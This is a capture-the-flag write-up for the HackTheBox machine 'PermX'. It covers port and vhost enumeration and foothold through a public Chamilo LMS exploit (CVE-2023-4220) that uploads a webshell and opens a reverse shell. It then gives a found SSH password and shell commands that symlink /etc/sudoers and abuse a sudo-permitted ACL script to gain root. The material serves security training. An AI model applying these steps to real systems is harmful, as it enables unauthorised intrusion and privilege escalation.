# PermX

<figure><img src="../../.gitbook/assets/PermX.png" alt=""><figcaption></figcaption></figure>

## Enumeration

```bash
nmap -v -A -O -p- -T4 -Pn -sC permx.htb -oN nmap
```

```bash
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.046s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE         VERSION
22/tcp    open     ssh             OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp    open     http            Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: eLEARNING
4444/tcp  filtered krb524
44444/tcp open     cognex-dataman?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=7/25%OT=22%CT=1%CU=41801%PV=Y%DS=2%DC=T%G=Y%TM=66A2
OS:20D1%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=Z%TS=B)SEQ(SP
OS:=FF%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD=2%ISR=10C%TI=Z%CI=Z%
OS:II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11N
OS:W7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE8
OS:8%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40
OS:%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=
OS:%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%
OS:W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=
OS:)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%
OS:DFI=N%T=40%CD=S)

Uptime guess: 9.364 days (since Tue Jul 16 03:10:15 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=255 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   44.17 ms 10.10.14.1
2   44.35 ms permx.htb (10.10.11.23)

NSE: Script Post-scanning.
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
Initiating NSE at 11:54
Completed NSE at 11:54, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.11 seconds
           Raw packets sent: 66838 (2.947MB) | Rcvd: 66257 (2.656MB)

```

### Port 80

<figure><img src="../../.gitbook/assets/image (875).png" alt=""><figcaption></figcaption></figure>

Trying to fuzzing vhosts we obtain some interesting results:

{% code overflow="wrap" %}
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt  -H "Host: FUZZ.permx.htb" -u http://permx.htb -t 100 -fc 302 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (877).png" alt=""><figcaption></figcaption></figure>

Navigate to `lms.permx.htb` after adding it to `/etc/hosts`:

<figure><img src="../../.gitbook/assets/image (876).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
<mark style="color:orange;">**Chamilo**</mark> is an open-source learning management system (LMS) that provides a comprehensive platform for e-learning and online education. It is designed to facilitate the creation, management, and delivery of educational content and courses.
{% endhint %}

The username associated to Davis Miller, the Administrator of platform, is admin.

## Foothold (www-data)

Searching on the web seems to exists a PoC for the **CVE-2023-4220** associated to Chamilo versions preceding **1.11.24.**

{% embed url="https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc" %}

<figure><img src="../../.gitbook/assets/image (878).png" alt=""><figcaption></figcaption></figure>

Ok, seems to be vulnerable, so upload a webshell and then trigger a revshell using the `-a revshell` option:

<figure><img src="../../.gitbook/assets/image (880).png" alt=""><figcaption></figcaption></figure>

Searching in the file system we can find an interesting config file:

<figure><img src="../../.gitbook/assets/image (881).png" alt=""><figcaption></figcaption></figure>

But trying to login using these credentials is a fail:

<figure><img src="../../.gitbook/assets/image (882).png" alt=""><figcaption></figcaption></figure>

So get linpeas and start enumeration obtaining some passwords:

<figure><img src="../../.gitbook/assets/image (883).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (885).png" alt=""><figcaption></figcaption></figure>

and the user with console on the system:

<figure><img src="../../.gitbook/assets/image (884).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation (mtz)

SSH as `mtz` user using password -> `03F6lY3uXAP2bkW8`

and get the user flag :tada:

<figure><img src="../../.gitbook/assets/image (886).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation (root)

Checking the sudo privileges we see that the mtz user can run `acl.sh`:

<figure><img src="../../.gitbook/assets/image (887).png" alt=""><figcaption></figcaption></figure>

This script can change the permissions of any file inside the /home/mtz directory. So let’s just make a symbolic link to the sudoers file and change our permissions on this file to read/write:

```bash
ln -s /etc/sudoers helpfile
sudo /opt/acl.sh mtz rw /home/mtz/helpfile
```

After that just open the helpfile and add mtz user to sudoers, sudo su and get root flag:

<figure><img src="../../.gitbook/assets/image (889).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (890).png" alt=""><figcaption></figcaption></figure>
